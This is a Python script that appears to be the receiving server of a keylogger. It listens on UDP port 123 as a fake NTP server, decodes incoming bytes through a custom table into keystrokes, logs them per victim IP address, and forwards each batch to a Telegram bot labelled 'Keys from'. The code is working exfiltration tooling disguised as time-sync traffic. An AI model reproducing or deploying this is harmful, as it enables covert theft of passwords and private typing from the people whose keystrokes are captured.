import socket
import requests


# ========= Change here If you want to send messages to telegram =================

telegram_bot_token = ''

telegram_bot_chatID = ''

# ========= Change here If you want to send messages to telegram =================







localIP     = "0.0.0.0"

localPort   = 123

bufferSize  = 3024

msgFromServer       = "Hello UDP Client"

bytesToSend         = str.encode(msgFromServer)

# Create a datagram socket

UDPServerSocket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)

# Bind to address and ip

UDPServerSocket.bind((localIP, localPort))

print("NTP server listening:")

# Listen for incoming datagrams

character_array = [ '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', ' ', '!', '"', '#', '$', '%', '&',  '(', ')', '*', '+', ',', '-', '.', '/', ':', ';', '<', '=', '>', '?', '@', '[', ']', '^', '_', '`', '{', '|', '}', '~' ]
    
hex_array = [ '0x01', '0x02', '0x03', '0x04', '0x05', '0x06', '0x07', '0x08', '0x09', '0x0A', '0x0B', '0x0C', '0x0D', '0x0E', '0x0F', '0x10', '0x11', '0x12', '0x13', '0x14', '0x15', '0x16', '0x17', '0x18', '0x19', '0x1A', '0x1B', '0x1C', '0x1D', '0x1E', '0x1F', '0x20', '0x21', '0x22', '0x23', '0x24', '0x25', '0x26', '0x27', '0x28', '0x29', '0x2A', '0x2B', '0x2C', '0x2D', '0x2E', '0x2F', '0x30', '0x31', '0x32', '0x33', '0x34', '0x35', '0x36', '0x37', '0x38', '0x39', '0x3A', '0x3B', '0x3C', '0x3D', '0x3E', '0x3F', '0x5B', '0x5C', '0x5D', '0x5E', '0x5F', '0x60',  '0x7B', '0x7C', '0x7D', '0x7E', '0x7F', '0x57', '0x45', '0x46', '0x47', '0x48', '0x49', '0x4A', '0x4B', '0x4C', '0x4D', '0x4E', '0x50', '0x51', '0x52', '0x53', '0x54', '0x55', '0x56', '0x58' ]
 


def telegram_bot_send_message(bot_message):

    global telegram_bot_token
    global telegram_bot_chatID

    bot_message = bot_message.replace('_', '-')
    bot_message = bot_message.replace('*', '-')
    bot_message = bot_message.replace('&', '-')
    bot_message = bot_message.replace('#', '')

    if(telegram_bot_token != '' and telegram_bot_chatID != ''):
        send_text = 'https://api.telegram.org/bot' + telegram_bot_token + '/sendMessage?chat_id=' + telegram_bot_chatID + '&parse_mode=Markdown&text=' + bot_message

        requests.get(send_text)

def convert_to_normal_str(anormal_hex):
    result_str = ""
    for x in range(2, len(anormal_hex), 2):        
        normal_hex = "0x" + str(anormal_hex[x-2:x]).upper()

        result_str += character_array[hex_array.index(normal_hex)]  

    return result_str

while(True):

    try:
        bytesAddressPair = UDPServerSocket.recvfrom(bufferSize)
        message = bytesAddressPair[0]
        address = bytesAddressPair[1]


        print("Keys from: " + str(address[0]) + "\n" + convert_to_normal_str(message.hex()))
        f = open(address[0], "a")
        f.write(convert_to_normal_str(message.hex()))
        f.close()

        telegram_bot_send_message("Keys from " + address[0] + ":\n" + convert_to_normal_str(message.hex()))
    except:
        pass
    
